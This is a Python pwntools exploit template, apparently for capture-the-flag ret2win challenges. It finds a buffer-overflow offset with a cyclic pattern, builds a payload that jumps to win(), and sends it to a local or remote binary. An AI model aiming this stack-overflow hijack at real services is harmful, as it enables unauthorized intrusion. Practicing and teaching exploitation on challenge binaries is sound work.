#!/usr/bin/env python3
"""ret2win template (pwntools). Finds win() in the local binary, builds
padding + [ret for alignment] + win, sends it local or remote.

    python ret2win.py ./vuln                                  # local process, auto offset via cyclic
    python ret2win.py ./vuln pwn1.chal.deti 9001 --offset 72  # remote
    python ret2win.py ./vuln HOST PORT --offset 72 --func win --align --prompt 'name?'
"""
import argparse

from pwn import ELF, ROP, context, cyclic, cyclic_find, p32, p64, process, remote


def find_offset(path, prompt):
    io = process(path)
    if prompt:
        io.recvuntil(prompt.encode(), timeout=2)
    io.sendline(cyclic(400, n=context.bytes))
    io.wait()
    core = io.corefile
    if context.bits == 64:
        return cyclic_find(core.read(core.rsp, 8), n=8)
    return cyclic_find(core.eip, n=4)


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("binary")
    ap.add_argument("host", nargs="?")
    ap.add_argument("port", nargs="?", type=int)
    ap.add_argument("--offset", type=int)
    ap.add_argument("--func", default="win")
    ap.add_argument("--align", action="store_true", help="insert a 'ret' gadget (movaps alignment)")
    ap.add_argument("--prompt", default="", help="text to wait for before sending")
    a = ap.parse_args()
    context.binary = e = ELF(a.binary, checksec=True)
    context.log_level = "info"
    off = a.offset if a.offset is not None else find_offset(a.binary, a.prompt)
    target = e.symbols[a.func]
    pk = p64 if context.bits == 64 else p32
    chain = b""
    if a.align:
        chain += pk(ROP(e).find_gadget(["ret"])[0])
    payload = b"A" * off + chain + pk(target)
    print(f"[*] offset={off} {a.func}=0x{target:x} len={len(payload)}")
    io = remote(a.host, a.port) if a.host else process(a.binary)
    if a.prompt:
        io.recvuntil(a.prompt.encode(), timeout=3)
    io.sendline(payload)
    print(io.recvall(timeout=3).decode(errors="replace"))


if __name__ == "__main__":
    main()
